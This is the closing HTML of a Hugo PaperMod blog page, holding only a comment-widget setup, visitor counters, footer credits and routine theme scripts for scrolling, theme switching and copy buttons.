<script>twikoo.init({envId:"https://twikoo-oopsdc.vercel.app/",el:"#tcomment",path:window.TWIKOO_MAGIC_PATH||window.location.pathname})</script></div></article></main><footer class=footer><div><span id=busuanzi_container_site_pv>Views: <span id=busuanzi_value_site_pv></span></span>
&nbsp;
<span id=busuanzi_container_site_uv>Visitors: <span id=busuanzi_value_site_uv></span></span></div><span>&copy; 2022 <a href=https://oopsdc.com/>0opsdc</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>